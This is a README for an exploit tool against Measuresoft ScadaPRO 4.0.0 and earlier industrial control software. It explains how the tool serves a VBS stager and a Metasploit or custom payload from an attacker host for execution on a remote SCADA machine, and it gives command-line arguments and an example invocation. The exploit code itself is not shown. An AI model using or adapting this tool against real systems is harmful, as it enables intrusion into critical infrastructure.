# Measuresoft-ScadaPRO
2-staged exploit for vulnerability that arises in Measuresoft ScadaPRO 4.0.0 (and earlier) versions. <br>
This exploits doesn't perform RCE, which makes it unique it serves payload through the locally hosted web server. <br>
You should generate your own or metasploit payload in this directory which you want to be executed on remote scada host.

## Requirements
```
Python 3.x
Libraries:
argparse
requests
sys
os
```

## CLI parse explanation
```
rhost = remote host ip address
rport = remote host port used for exploitation
lhost = local (or remote) host which will be used to serve payload
lport = local (or remote) host port used for serving payload
payload_name = file name for payload served
stager_name = file name for vbs script which is stager
temp_folder = directory where vbs stager will be hosted
```
## Usage
`ALL ARGUMENTS MUST BE USED` <br>
Usage: `python3 exploit.py [rhost] [rport] [lhost] [lport] [payload name] [stager name] [temp directory]` <br>
Example: `python3 exploit.py 192.168.1.1 502 192.168.1.2 8080 payload.exe stager.vbs /tmp`

# Disclaimer
### Do not use this against targets that did not give you authorization to do it. I am not responsible for any misusage of this program.


```
  _________                  .___       
 /   _____/ ____ _____     __| _/____   
 \_____  \_/ ___\\__  \   / __ |\__  \  
 /        \  \___ / __ \_/ /_/ | / __ \_
/_______  /\___  >____  /\____ |(____  /
        \/     \/     \/      \/     \/ 
```
